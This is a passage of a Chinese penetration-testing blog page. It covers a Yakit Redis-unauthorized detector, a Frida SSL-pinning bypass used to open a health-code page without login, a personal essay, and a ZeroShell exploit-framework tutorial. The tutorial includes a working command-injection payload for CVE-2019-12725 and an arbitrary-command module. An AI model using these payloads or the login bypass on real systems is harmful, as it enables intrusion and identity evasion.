-<p><img src="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/plugin_info.png" alt="Untitled"></p>
-<p>之后开始编写插件源码。</p>
-<p>首先我们必须要对插件进行初始化：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yakit.AutoInitYakit()</span><br></pre></td></tr></table></figure>
-
-<p>接着运用同样的检测思路：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">target = cli.String(<span class="string">&quot;target&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> target == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">    yakit.Error(<span class="string">&quot;Empty Target&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">port = cli.Int(<span class="string">&quot;port&quot;</span>, cli.setDefault(<span class="number">6379</span>))</span><br><span class="line"><span class="keyword">if</span> port &lt;= <span class="number">0</span> &#123;</span><br><span class="line">    yakit.Error(<span class="string">&quot;Port is invalid&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">conn,err = tcp.Connect(target, port)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line">    yakit.Error(<span class="string">&quot;Connect to %v failed: %v&quot;</span>, target, err)</span><br><span class="line">&#125;</span><br><span class="line">die(err)</span><br><span class="line"></span><br><span class="line">yakit.Info(<span class="string">&quot;write info to %v&quot;</span>, target)</span><br><span class="line">conn.Send(<span class="string">&quot;info\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">yakit.Info(<span class="string">&quot;Start to waiting result&quot;</span>)</span><br><span class="line">result, err := conn.RecvStringTimeout(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">str</span>.MatchAllOfSubString(result, <span class="string">&quot;redis_version&quot;</span>) &#123;</span><br><span class="line">    yakit.StatusCard(<span class="string">&quot;Redis未授权访问漏洞&quot;</span>, <span class="built_in">str</span>.HostPort(target, port))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里面某些函数和单独编写<code>yak</code>脚本不同，具体内容可以参考<code>Yakit</code>的API文档</p>
-<p>源码编写好之后，我们需要添加一个必要参数，也就是目标：</p>
-<p><img src="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/plungin_must.png" alt="Untitled"></p>
-<p>点击下方创建新模块之后，在插件板块我们就可以看到我们编写的新插件：</p>
-<p><img src="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/plungin_final.png" alt="Untitled"></p>
-<p>输出目标IP之后测试一下：</p>
-<p><img src="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/plungin_result.png" alt="Untitled"></p>
-<p>至此，一个简单的<code>Redis未授权</code>检测插件编写完毕。</p>
-<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h2><p>yak的用法显然不止如此，还有更为强大的<code>poc</code>函数和<code>nuclei</code>函数，官方的文档也非常清晰易懂，适合小白入手。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/" data-id="cl0oq0f7a000uh0v04td6cwvb" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-无需登陆出示验证码" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/" class="article-date">
-  <time datetime="2022-01-17T06:04:20.000Z" itemprop="datePublished">2022-01-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/">无需登陆出示验证码</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>有时候逛商场坐地铁需要出示健康码，长时间不登陆就需要重新登陆，很麻烦。今天这个东西其实早在去年就发现了，但是没怎么注意，今天因为工作需要测试突然发现去年的那个链接现在居然还可以直接打开并且是实时获取的。</p>
-<h4 id="这里要说明，本篇文章仅供学习交流，严禁进行非法测试！！"><a href="#这里要说明，本篇文章仅供学习交流，严禁进行非法测试！！" class="headerlink" title="这里要说明，本篇文章仅供学习交流，严禁进行非法测试！！"></a>这里要说明，<strong>本篇文章仅供学习交流，严禁进行非法测试！！</strong></h4><h2 id="0x02-正文"><a href="#0x02-正文" class="headerlink" title="0x02 正文"></a>0x02 正文</h2><p>夜神模拟器装好app之后，进行登陆，点进<code>**码</code>页面，然后开启Burp，由于app设置了SSL Pining证书校验，所以需要先绕过：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">adb connect <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">62001</span>          <span class="comment">//连接到模拟器</span></span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">su</span><br><span class="line"></span><br><span class="line">cd /data/local/tmp</span><br><span class="line"></span><br><span class="line">./hluda-server-<span class="number">14.2</span><span class="number">.18</span>-android-x86     <span class="comment">//运行hluda-server</span></span><br><span class="line"></span><br><span class="line">frida-ps -U        <span class="comment">//新建终端，列出进程</span></span><br><span class="line"></span><br><span class="line">frida -U -f <span class="keyword">package</span>         <span class="comment">//注入进程</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/insert.png" alt="Untitled"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python frida-skeleton.py package</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/ske.png" alt="Untitled"></p>
-<p>回到app，点击<code>疫苗&amp;核酸</code>同时开启抓包</p>
-<p>此时可以正常抓取到通信流量。</p>
-<p>放包，直到看到<code>code=</code>字样</p>
-<p><img src="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/code.png" alt="Untitled"></p>
-<p>发送到<code>Repeter</code>，进行重放</p>
-<p><img src="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/repe.png" alt="Untitled"></p>
-<p>会得到一个跳转链接，取出其中的<code>mw</code>字段</p>
-<p>填入下方</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxx.gov.cn/smzy/fyz/qrcode?from=smy&amp;latitude=&amp;longitude=&amp;address=&amp;mw=yourmw&amp;type=FY_QRCODE_01&amp;usertype=1&amp;m=</span></span><br></pre></td></tr></table></figure>
-
-<p>访问完整的链接，就会看到健康码，且实时动态刷新。</p>
-<p>点击去年的链接：</p>
-<p><img src="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/resu.png" alt="Untitled"></p>
-<p>现在只需要访问这个链接就可以直接出示健康码，无需进行人脸识别的登陆。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/" data-id="cl0oq0f7j0020h0v06648drze" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-2021年思想记录" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/12/31/2021%E5%B9%B4%E6%80%9D%E6%83%B3%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time datetime="2021-12-31T01:53:51.000Z" itemprop="datePublished">2021-12-31</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82%E8%B0%88/">杂谈</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          <a class="icon" target="_blank" rel="noopener" href="/" aria-label="twitter">
+            <i class="fab fa-twitter"></i><!--
+      ---></a><!--
+    ---><!--
+    --->, 
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/31/2021%E5%B9%B4%E6%80%9D%E6%83%B3%E8%AE%B0%E5%BD%95/">2021年思想记录</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
       
-        <p>“似水流年，沧海桑田，但是我对理性和同情的信心不变，我始终相信认识世界的必要。”——梁文道</p>
-<p>2021年6月从学校毕业，正式进入工作，到现在算是半年时间了。</p>
-<p>经历了从学生到职员的转变，看待事物和以往的一些想法有了些许变化，效仿cdxy师傅也做一个思想记录。不可否认会有些许偏见，也许很长时间之后才意识到错误。</p>
-<h3 id="关于快餐式恋爱"><a href="#关于快餐式恋爱" class="headerlink" title="关于快餐式恋爱"></a>关于快餐式恋爱</h3><p>不得不承认，从高中毕业直到现在，再也没有出现过那种心动的感觉。</p>
-<p>“也不是不想处对象，就是想再等等，具体等谁呢，不知道，具体等个什么样的呢，也不知道，你说不想找吧，也想找，你说想找吧，也不是太想找，你说不着急吧，看到别人处对象也有点慌，你说着急吧，却也不是怎么很想要，别人给介绍吧，加了也不唠，看到好看的，就会说卧槽，转头不记得这人长什么样了，你说渣吧，也渣，不主动，不拒绝，你说专情吧，也挺专情，心里有一个地方，就是不让人进，这里边到底是谁呢，我自己也不清楚。”</p>
-<p>认识一个女生两个月，朋友都说赶紧拿下，可是为什么才认识短短的一两个月就要在一起呢？这么短的时间互相之间能有多了解呢？是真的喜欢吗？为什么要为了谈恋爱而谈恋爱呢？为什么不是因为真的很喜欢才谈恋爱呢？</p>
-<p>总觉得越来越不理解如今的恋爱观，”在这个快餐爱情肆意横行的时代，我熬的粥又淡又慢，谁会喜欢呢，慢热式的爱情总是不尽人意。“</p>
-<p>我不希望仅仅只是为了恋爱而去恋爱，我希望在将情愫掩埋，经过时间的沉淀，那时候大抵才是真正的喜欢而想和你在一起。</p>
-<p>很怀念当初高中那份喜欢，朦朦胧胧，不夹带任何杂质。</p>
-<p>虽说最后的结果不尽如人意，至少想起来的时候很美好。</p>
-<p>间歇性渴望爱情，持续性享受单身。</p>
-<p>至少现在的我，自由自在。</p>
-<p>总觉得做了一重又一重的梦，梦里你牵着我的手，我们一起奔向那自由，突然梦醒了，你还在向未来游走，而我停在了原地不知缘由。情不知何起，微风落叶知秋，再难回头。</p>
-<h3 id="关于社交圈"><a href="#关于社交圈" class="headerlink" title="关于社交圈"></a>关于社交圈</h3><p>很怀念在学校的时光，和同学朋友一起玩。</p>
-<p>毕业后，大家不同的地方，不同的行业，可以聊天的越来越少。</p>
-<p>之前我有说过，我和身边所有人的关系都很淡，在我的圈子里没有一个真正的可以无话不谈的朋友，只有“关系很好”、“关系比较熟”之类的。性格使然。</p>
-<p>我既不喜欢麻烦别人，也不喜欢被别人麻烦。</p>
-<p>毕业之后这半年除了工作上的同事之外，我几乎没有社交。</p>
-<p>每天下班回到家会很累了，没有剩余的精力再去参加各类的社交。</p>
-<p>我将微信昵称起做“斑马还没睡”，因为斑马是群居动物，只有跟同伴在一起才会真正的入睡。</p>
-<p>最近很喜欢听张尧的《孤独圆舞曲》，尤其是在公交车的时候，双耳带上耳机，目光游离在车窗外，看着车来车往，声音调至刚刚掩盖人声，那一瞬间觉得完全沉浸在自己的世界里面。</p>
-<p>有时候我会想我真的适合一个人生活，没有过多的闲暇琐事打扰。</p>
-<h3 id="关于网红与流量"><a href="#关于网红与流量" class="headerlink" title="关于网红与流量"></a>关于网红与流量</h3><p>“流量至上，娱乐至死。”</p>
-<p>“网红”这个词，最早应该起源于零几年，那时候我应该在小学。对我来说从初中开始才接触到的网络，而所谓的网红大部分是指那些在某一地方有些成果的人。</p>
-<p>随着短视频领域和平台的崛起，网红再也不是触不可及，普通人通过拍视频也可以成为网红，这其中就涉及到流量。</p>
-<p>究竟是流量带动网红，还是网红催生流量，不得而知。</p>
-<p>第一次看到这种视频是在某个短视频平台上面，一个农民裸着上身在泥地里打滚，意外的是，那个视频竟有几万的点击量。</p>
-<p>短视频时代的来临让普通人也可以成为网红，然后会有大把大把的利润，可以说是一条捷径了。</p>
-<p>以前曾刷到过一个帖子，大体是批判现在这种为了热度流量可以牺牲脸面的视频。有一个评论印象很深刻，他说当一个机会在你面前，不偷不抢不犯法，没风险收获大，如果你不会选，可能因为你不屑，但如果收获的利润最够让你动心呢？你还会不屑吗？</p>
-<p>前段时间火了一个cos小丑的人，你说他为了火拍视频是个小丑吗？但是他却是优秀退役士兵，有车有房有妻有子。那些看视频嘲笑的人，到底谁才是真正的小丑。</p>
-<p>如今的网红文化已经在一定程度上影响了社会的观念，甚至已经开始影响到了下一代。</p>
-<p>“打工是不可能打工的，这辈子都不可能打工的。”</p>
-<p>还记得当时这句话吗，在当时这是一个梗，但当他出狱后，却成为了千万流量的网红。</p>
-<p>羡慕吗，当然羡慕。谁不想自己变得富有呢。</p>
-<p>讽刺吗，讽刺。大多数普通人勤勤恳恳奋斗一辈子甚至不及他的零头。</p>
-<p>但在某种意义上讲，出狱后仍能找到好的去处，这是不是算是一种进步呢？</p>
-<p>短视频可以算作快节奏时代的产物，每个人的生活节奏越来越快。</p>
-<p>对人们来说，需要的只是适当的时候可以被视频内容逗笑或是感染，达到短暂的满足。</p>
-<p>从最早的平铺直叙到现在的“震惊！某某男子竟然······”，自媒体营销号算是引流的代表。</p>
-<p>我十分反感甚至可以说是厌恶这种夸大其词的文章标题。无非是为了博得眼球，吸引流量。而文章内容往往和标题相差十万八千里。</p>
-<p>但反过来想，如果我是编者，似乎我也会用这种方法，毕竟写出来的文章就是给别人看的，文章质量暂且不谈但是浏览量的目的达到了。</p>
-<p>网红和流量，并无可批判，且本身就没有什么不对，暂且聊表心意。</p>
-<h2 id="关于新年"><a href="#关于新年" class="headerlink" title="关于新年"></a>关于新年</h2><p>我与旧事归于尽，来年依旧迎花开。</p>
-<p>祝我自己，得偿所愿，平安喜乐，自由自在，永远少年。</p>
-<p>——2021.12.31</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/12/31/2021%E5%B9%B4%E6%80%9D%E6%83%B3%E8%AE%B0%E5%BD%95/" data-id="cl0oq0f6z0001h0v0fm9n8itp" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-神机漏洞利用框架学习" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time datetime="2021-12-20T08:16:46.000Z" itemprop="datePublished">2021-12-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/">神机漏洞利用框架学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="一、建立漏洞框架"><a href="#一、建立漏洞框架" class="headerlink" title="一、建立漏洞框架"></a>一、建立漏洞框架</h2><p>使用IEDA打开项目，进入<code>src/main/resources/fxml</code></p>
-<p>复制一个漏洞框架直接粘贴并修改名称为漏洞框架名称，例如：</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/fxml.png" alt="Untitled"></p>
-<p>这里就是新建了一个ZeroShell.fxml文件</p>
-<p>之后打开新建的文件，修改第13行代码和名称一致</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/change13.png" alt="Untitled"></p>
-<p>接着在<code>src/main/java/fun.fireline/controller</code></p>
-<p>右键新建java文件，名称为新建的漏洞</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/contro.png" alt="Untitled"></p>
-<p>下一步，在<code>src/main/resources/fxml/Main.fxml</code></p>
-<p>文件的第43行新建一行ZeroShell</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/main.png" alt="Untitled"></p>
-<p>然后运行<code>src/main/java/fun/fireline/AppStartUp.java</code></p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/firun.png" alt="Untitled"></p>
-<p>ZeroShell的界面已经出来了。</p>
-<h2 id="二、编写漏洞利用模块"><a href="#二、编写漏洞利用模块" class="headerlink" title="二、编写漏洞利用模块"></a>二、编写漏洞利用模块</h2><h3 id="2-1-检测模块—CheckVul"><a href="#2-1-检测模块—CheckVul" class="headerlink" title="2.1 检测模块—CheckVul"></a>2.1 检测模块—CheckVul</h3><p>打开新建的java文件<code>public class ZeroShell implements ExploitInterface</code></p>
-<p>这时候会报红，单击灯泡选择实现全部方法（Implement methods）</p>
-<p>然后就会自动填充框架</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/check.png" alt="Untitled"></p>
-<p>然后编写检测逻辑，这里以ZeroShell RCE来举例</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">checkVul</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = url;</span><br><span class="line">        <span class="comment">// 这里可以通过判断对方是否执行了 md5 计算，输出 61a0f37eada6108084f3298115fc1762 来验证漏洞是否存在</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">check_payload</span> <span class="operator">=</span> <span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d\\&quot;</span>echo%2061a0f37eada6108084f3298115fc1762\\<span class="string">&quot;%0A&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">// get 请求，根据不同的exp，可能需要不同的请求方式，看需更改</span></span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> HttpTools.get(<span class="built_in">this</span>.target + check_payload, <span class="built_in">this</span>.headers, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 看回显，是否存在 61a0f37eada6108084f3298115fc1762 md5(cve201912725)</span></span><br><span class="line">        <span class="keyword">if</span>(response.getText() != <span class="literal">null</span>  &amp;&amp; response.getText().contains(<span class="string">&quot;61a0f37eada6108084f3298115fc1762&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.isVul = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[+] 目标存在&quot;</span> + <span class="built_in">this</span>.getClass().getSimpleName() + <span class="string">&quot;漏洞 \\t &quot;</span> + <span class="string">&quot;Payload: \\t&quot;</span> + <span class="built_in">this</span>.target + check_payload;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (response.getError() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[-] 检测漏洞&quot;</span> + <span class="built_in">this</span>.getClass().getSimpleName() + <span class="string">&quot;失败， &quot;</span> + response.getError();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[-] 目标不存在&quot;</span> + <span class="built_in">this</span>.getClass().getSimpleName() + <span class="string">&quot;漏洞&quot;</span> + check_payload;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后运行测试：</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/checkrun.png" alt="Untitled"></p>
-<p>还可以设置代理观察具体的流量：</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/proxy.png" alt="Untitled"></p>
-<h3 id="2-2-命令执行模块—exeCmd"><a href="#2-2-命令执行模块—exeCmd" class="headerlink" title="2.2 命令执行模块—exeCmd"></a>2.2 命令执行模块—exeCmd</h3><p>先将 <strong>isVul</strong>方法改一下，命令执行依赖于检测，只有检测存在，才能进行命令执行</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isVul</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.isVul;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>之后编写：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">exeCmd</span><span class="params">(String cmd, String encoding)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d\\&quot;</span>payload\\<span class="string">&quot;%0A&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换payload 中的 payload 字符为要执行的命令</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot;payload&quot;</span>, cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> HttpTools.get(<span class="built_in">this</span>.target + payload, <span class="built_in">this</span>.headers, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tools.regReplace(response.getText());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行测试：</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/runexec.png" alt="Untitled"></p>
-<p>使用的时候发现一个问题，当命令改变的时候，会提示要重新进行漏洞检测：</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/revi.png" alt="Untitled"></p>
-<p>控制台会报错：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] <span class="number">2021</span>-<span class="number">12</span>-<span class="number">20</span> <span class="number">13</span>:<span class="number">56</span>:<span class="number">49</span>,<span class="number">744</span> method:fun.fireline.tools.HttpTools.getResponse(HttpTools.java:<span class="number">108</span>)</span><br><span class="line">java.net.SocketTimeoutException: Read timed out</span><br></pre></td></tr></table></figure>
-
-<p>发现是exp代码的问题，两个单词命令之间用%20空格符填充即可。</p>
-<p><img src="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/execsuc.png" alt="Untitled"></p>
-<h3 id="2-3-WebShell上传模块—uploadFile"><a href="#2-3-WebShell上传模块—uploadFile" class="headerlink" title="2.3 WebShell上传模块—uploadFile"></a>2.3 WebShell上传模块—uploadFile</h3><p><del>真实环境，不便测试，暂留</del></p>
-<h2 id="完整利用代码"><a href="#完整利用代码" class="headerlink" title="完整利用代码"></a>完整利用代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 